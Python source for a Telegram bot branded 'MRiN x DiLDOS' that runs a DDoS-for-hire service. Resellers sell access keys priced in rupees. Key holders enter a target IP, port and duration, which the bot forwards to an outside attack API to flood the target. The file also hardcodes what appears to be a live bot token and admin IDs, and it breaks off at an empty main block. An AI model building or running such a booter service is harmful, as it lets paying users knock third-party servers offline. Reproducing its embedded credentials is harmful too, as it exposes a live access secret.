import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import logging
import requests
from telebot import types
from dateutil.relativedelta import relativedelta

# Insert your Telegram bot token here
bot = telebot.TeleBot('7072312985:AAHgR5Lc87DxZANKH2cIeXCgd1PuSInMYD0')

# Admin user IDs
admin_id = {"6768273586", "2007860433"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
BOT_LINK = "@MRiN_DiLDOS_bot"
escaped_bot_link = BOT_LINK.replace('_', '\\_')

# Per key cost for resellers
KEY_COST = {"1hour": 30, "1day": 150, "7days": 450, "1month": 1100}

# In-memory storage
users = {}
keys = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"MoY-ViP-{random_key.upper()}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time
            
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "➖ Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."
        
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Load resellers and their balances from the JSON file
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

# Save resellers and their balances to the JSON file
def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

# Initialize resellers data
resellers = load_resellers()

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ 𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ‼️")
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    broadcast_msg = command_parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | set(admin_id)  # Combine all user IDs

    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *Broadcast Message :*\n\n{broadcast_msg}", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"{e}")

    bot.reply_to(message, f"➖ Broadcast sent successfully to {sent_count} users ! ✅")


# Admin command to add a reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ 𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ‼️")
        return

    # Command syntax: /addreseller <user_id> <initial_balance>
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return

    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝗻𝘁❗️")
        return

    # Add reseller to the resellers.json
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"➖ *𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗨𝘀𝗲𝗿 𝗜𝗗* : {reseller_id}\n*𝗕𝗮𝗹𝗮𝗻𝗰𝗲* : {initial_balance} *Rs*\n\n⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 :* ⚡\n\n➖*𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗕𝗔𝗟𝗔𝗡𝗖𝗘*   :   `/balance` \n➖*𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗘𝗪 𝗞𝗘𝗬*   :   `/genkey`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"➖ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀", parse_mode='Markdown')

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)

    # Syntax: /genkey <duration>
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "➖ *𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀𝙔 '𝙨 & 𝘾𝙊𝙎𝙏 : \n➖ 𝟭𝗵𝗼𝘂𝗿 : 𝟯𝟬 Rs \n➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟱𝟬 Rs\n➖ 𝟳𝗱𝗮𝘆𝘀 : 𝟰𝟱𝟬 Rs\n➖ 𝟭𝗺𝗼𝗻𝘁𝗵 : 𝟭𝟭𝟬𝟬 Rs\n\n➖ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : /𝗴𝗲𝗻𝗸𝗲𝘆  𝟭𝗺𝗼𝗻𝘁𝗵*", parse_mode='Markdown')
        return

    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "*𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻*", parse_mode='Markdown')
        return

    cost = KEY_COST[duration]

    if user_id in admin_id:
        key = create_random_key()  # Generate the key using the renamed function
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        response = f"➖ *𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗞𝗲𝘆* : `{key}`\n*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n\n*𝗕𝗢𝗧 𝗟𝗶𝗡𝗞* : {escaped_bot_link}"

    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)

            key = create_random_key()  # Generate the key using the renamed function
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            response = f"➖ *𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗞𝗲𝘆* : `{key}`\n*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n𝗖𝗼𝘀𝘁: {cost} Rs\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 : {resellers[user_id]} Rs"
        else:
            response = f"❗️*𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲* {duration} *𝗸𝗲𝘆*\n*𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 *: {cost} *Rs*\n*𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲* : {resellers[user_id]} Rs"
    else:
        response = "⛔️ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 : 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱*"

    bot.reply_to(message, response, parse_mode='Markdown')

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)

    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 *𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀* : {current_balance}."
    else:
        response = "⛔️ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 : 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱*"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    try:
        help_text = """
⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/addreseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key of destiny!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!* ⚔️
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/removereseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"{str(e)}", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()

    if key in keys:
        # Check if the user already has VIP access
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, f"❕*𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀*❕", parse_mode='Markdown')
                return
            else:
                del users[user_id]  # Remove expired access
                save_users()

        # Set the expiration time based on the key's duration
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)  # Adding 1 month
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return

        # Add user to the authorized list
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        # Remove the used key
        del keys[key]
        save_keys()

        bot.reply_to(message, f"➖ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 !\n\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "‼️ 𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ‼️"
        bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 *𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™* 𝗯𝗼𝘁!", reply_markup=markup)

def send_attack_finished_message(chat_id, target, port, time_val):
    """Notify the user that the attack is finished."""
    message = f"➖ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ! ✅\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_val}s"
    try:
        bot.send_message(chat_id, message)
    except Exception as e:
        print(f"Failed to send finish message: {e}")

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user has VIP access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        # Check if the user's VIP access has expired
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️"
            bot.reply_to(message, response)
            return

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n*Oops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!*"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time_val = int(details[2])
            
            # Optional: Limit max time if needed, otherwise API handles it
            if time_val > 240:
                 response = "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 𝟮𝟰𝟬  𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
                 bot.reply_to(message, response)
                 return

            # Record and log the attack
            record_command_logs(user_id, 'attack', target, port, time_val)
            log_command(user_id, target, port, time_val)
            
            username = message.chat.username or "No username"

            # Prepare API Payload
            api_url = "https://api-production-58d6.up.railway.app/api/v1/attack"
            payload = {
                "ip": target,
                "port": port,
                "time": time_val
            }
            headers = {
                "Content-Type": "application/json"
            }

            try:
                # Send request to API
                resp = requests.post(api_url, json=payload, headers=headers, timeout=10)
                
                # --- START OF ADDED LOGGING ---
                print(f"--- API REQUEST LOG ---")
                print(f"User: {username} (ID: {user_id})")
                print(f"Target: {target}:{port}")
                print(f"Time: {time_val}s")
                print(f"API Status Code: {resp.status_code}")
                print(f"API Response Body: {resp.text}")
                print(f"-----------------------")
                # --- END OF ADDED LOGGING ---

                if resp.status_code == 200:
                    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time_val} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                    
                    # Start a timer to notify when finished
                    threading.Timer(time_val, send_attack_finished_message, [message.chat.id, target, port, time_val]).start()
                    
                else:
                    response = f"❌ 𝗔𝗣𝗜 𝗘𝗿𝗿𝗼𝗿: {resp.status_code}\n{resp.text}"
                    
            except Exception as e:
                # Log the exception as well
                print(f"--- API EXCEPTION LOG ---")
                print(f"User: {username} (ID: {user_id})")
                print(f"Target: {target}:{port}")
                print(f"Exception: {str(e)}")
                print(f"-------------------------")
                
                response = f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘁𝗼 𝗔𝗣𝗜: {str(e)}"

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    # Determine the user's role and additional information
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"  # Admins don’t have balances
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"  # Resellers may not have key-based access
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]  # Fetch expiration directly
        balance = "Not Applicable"  # Regular users don’t have balances
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {key_expiration}\n"
    )

    # Add balance info for resellers
    if role == "Reseller":
        response += f"💰 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {balance}\n"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    if users:
        response = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            response += f" *𝗨𝘀𝗲𝗿 𝗜𝗗 *: {user}\n *𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻* : {formatted_expiration}\n\n"
    else:
        response = "➖ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    # Extract the target User ID from the command
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return

    target_user_id = command[1]

    if target_user_id in users:
        # Remove the user and save changes
        del users[target_user_id]
        save_users()
        response = f"➖ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱"
    else:
        response = f"➖ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    # Check if the user is an admin before displaying resellers' information
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return

    # Construct a message showing all resellers and their balances
    resellers_info = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            try:
                # Attempt to get the reseller's username
                reseller_chat = bot.get_chat(reseller_id)
                reseller_username = f"@{reseller_chat.username}" if reseller_chat.username else "Unknown"
            except Exception as e:
                # Handle cases where the chat cannot be found
                logging.error(f"Error fetching chat for reseller {reseller_id}: {e}")
                reseller_username = "Unknown (Chat not found)"

            # Add reseller details to the message
            resellers_info += (
                f"➖  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {reseller_username}\n"
                f"➖  𝗨𝘀𝗲𝗿𝗜𝗗 : {reseller_id}\n"
                f"➖  𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {balance} Rs\n\n"
            )
    else:
        resellers_info += " ➖ 𝗡𝗼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲"

    # Send the resellers' information to the admin
    bot.reply_to(message, resellers_info)

       
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    # Check if the user is an admin
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            # Extract the reseller ID and amount from the message
            command_parts = message.text.split()
            if len(command_parts) != 3:
                bot.reply_to(message, "*𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>*", parse_mode='Markdown')
                return
            
            reseller_id = command_parts[1]
            amount = float(command_parts[2])
            
            # Check if the reseller exists
            if reseller_id not in resellers:
                bot.reply_to(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
                return
            
            # Add the balance to the reseller's account
            resellers[reseller_id] += amount
            bot.reply_to(message, f"✅ *𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝗱𝗱𝗲𝗱 ✅\n\n𝗢𝗟𝗗 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {amount} Rs\n𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗜𝗗 : {reseller_id}\n𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {resellers[reseller_id]} Rs*", parse_mode='Markdown')
            
        except ValueError:
            bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁")
    else:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        
@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    # Check if the user is an admin
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            # Extract the reseller ID from the message
            command_parts = message.text.split()
            if len(command_parts) != 2:
                bot.reply_to(message, "*𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱>*", parse_mode='Markdown')
                return
            
            reseller_id = command_parts[1]
            
            # Check if the reseller exists
            if reseller_id not in resellers:
                bot.reply_to(message, "*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.*", parse_mode='Markdown')
                return
            
            # Remove the reseller
            del resellers[reseller_id]
            bot.reply_to(message, f"*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆*", parse_mode='Markdown')
        
        except ValueError:
            bot.reply_to(message, "*𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗*")
    else:
        bot.reply_to(message, "‼ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ‼*", parse_mode='Markdown')
    
if __name__ == "__main__":
